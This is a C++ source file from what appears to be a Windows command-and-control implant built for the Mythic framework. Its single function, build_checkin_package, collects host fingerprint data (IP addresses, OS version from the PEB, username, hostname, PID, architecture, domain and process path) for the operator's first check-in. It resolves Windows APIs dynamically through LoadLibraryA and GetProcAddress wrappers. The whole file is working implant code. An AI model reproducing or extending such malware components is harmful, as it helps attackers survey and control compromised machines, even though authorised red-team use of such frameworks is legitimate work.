#include <common.h>
#include <checkin.h>
#include <package.h>
#include <strings.h>

using namespace stardust;
using namespace starburst;

typedef struct _CI_IP_ADDR_STRING {
    struct _CI_IP_ADDR_STRING* Next;
    char                       IpAddress[16];
    char                       IpMask[16];
    DWORD                      Context;
} CI_IP_ADDR_STRING;

typedef struct _CI_IP_ADAPTER_INFO {
    struct _CI_IP_ADAPTER_INFO* Next;
    DWORD  ComboIndex;
    char   AdapterName[260];
    char   Description[132];
    UINT   AddressLength;
    BYTE   Address[8];
    DWORD  Index;
    UINT   Type;
    UINT   DhcpEnabled;
    CI_IP_ADDR_STRING* CurrentIpAddress;
    CI_IP_ADDR_STRING  IpAddressList;
    CI_IP_ADDR_STRING  GatewayList;
    CI_IP_ADDR_STRING  DhcpServer;
    BOOL   HaveWins;
    CI_IP_ADDR_STRING  PrimaryWinsServer;
    CI_IP_ADDR_STRING  SecondaryWinsServer;
    time_t LeaseObtained;
    time_t LeaseExpires;
} CI_IP_ADAPTER_INFO;

typedef DWORD (WINAPI *fn_CI_GetAdaptersInfo)( CI_IP_ADAPTER_INFO*, PULONG );

auto declfn starburst::build_checkin_package(
    _Inout_ instance& inst
) -> Package* {
    auto pkg = package_create( inst );
    if ( !pkg ) return nullptr;

    // action byte
    package_add_byte( inst, pkg, ACTION_CHECKIN );

    // uuid
    package_add_string( inst, pkg, inst.agent.payload_uuid );

    // IPs - collect real addresses via GetAdaptersInfo
    {
        auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
            symbol<LPCSTR>( "iphlpapi.dll" ) ) );

        uint32_t ip_count = 0;
        char ip_list[16][16];

        if ( h_iphlpapi ) {
            auto pGetAdaptersInfo = reinterpret_cast<fn_CI_GetAdaptersInfo>(
                inst.kernel32.GetProcAddress( h_iphlpapi,
                    symbol<LPCSTR>( "GetAdaptersInfo" ) ) );

            if ( pGetAdaptersInfo ) {
                ULONG buf_size = 0;
                pGetAdaptersInfo( nullptr, &buf_size );
                if ( buf_size > 0 ) {
                    auto info = static_cast<CI_IP_ADAPTER_INFO*>( inst.heap_alloc( buf_size ) );
                    if ( info && pGetAdaptersInfo( info, &buf_size ) == 0 ) {
                        auto adapter = info;
                        while ( adapter && ip_count < 16 ) {
                            auto ip_entry = &adapter->IpAddressList;
                            while ( ip_entry && ip_count < 16 ) {
                                if ( ip_entry->IpAddress[0] != '0' || ip_entry->IpAddress[1] != '.' ) {
                                    memory::copy( ip_list[ip_count], ip_entry->IpAddress, 16 );
                                    ip_count++;
                                }
                                ip_entry = ip_entry->Next;
                            }
                            adapter = adapter->Next;
                        }
                    }
                    if ( info ) inst.heap_free( info );
                }
            }
        }

        if ( ip_count == 0 ) {
            package_add_int32( inst, pkg, 1 );
            package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "0.0.0.0" ) ) );
        } else {
            package_add_int32( inst, pkg, ip_count );
            for ( uint32_t i = 0; i < ip_count; i++ ) {
                package_add_string( inst, pkg, ip_list[i] );
            }
        }
    }

    // OS version from PEB
    {
        char os_str[64] = { 0 };
        PPEB peb = NtCurrentPeb();
        int_to_str( os_str, peb->OSMajorVersion, 10 );
        str_concat( os_str, symbol<char*>( const_cast<char*>( "." ) ) );
        char minor[12];
        int_to_str( minor, peb->OSMinorVersion, 10 );
        str_concat( os_str, minor );
        str_concat( os_str, symbol<char*>( const_cast<char*>( "." ) ) );
        char build[12];
        int_to_str( build, peb->OSBuildNumber, 10 );
        str_concat( os_str, build );

        package_add_string( inst, pkg, os_str );
    }

    // user
    {
        wchar_t username_w[128] = { 0 };
        DWORD   usize = 128;
        inst.advapi32.GetUserNameW( username_w, &usize );

        char username[128] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, username_w, -1, username, 128, nullptr, nullptr );
        package_add_string( inst, pkg, username );
    }

    // host
    {
        wchar_t hostname_w[128] = { 0 };
        DWORD   hsize = 128;
        inst.kernel32.GetComputerNameW( hostname_w, &hsize );

        char hostname[128] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, hostname_w, -1, hostname, 128, nullptr, nullptr );
        package_add_string( inst, pkg, hostname );
    }

    // pid
    package_add_int32( inst, pkg, static_cast<uint32_t>(
        reinterpret_cast<uintptr_t>( NtCurrentTeb()->ClientId.UniqueProcess ) ) );

    // architecture
#ifdef _M_X64
    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "x64" ) ) );
#else
    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "x86" ) ) );
#endif

    // domain - try environment variable
    {
        wchar_t domain_w[128] = { 0 };
        inst.kernel32.GetEnvironmentVariableW(
            symbol<LPCWSTR>( L"USERDOMAIN" ),
            domain_w, 128
        );

        char domain[128] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
        package_add_string( inst, pkg, domain );
    }

    // integrity level
    package_add_int32( inst, pkg, 2 );

    // external IP (empty - Mythic fills this)
    package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "" ) ) );

    // process name
    {
        wchar_t* img_path = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
        char proc_name[256] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, img_path, -1, proc_name, 256, nullptr, nullptr );
        package_add_string( inst, pkg, proc_name );
    }

    return pkg;
}
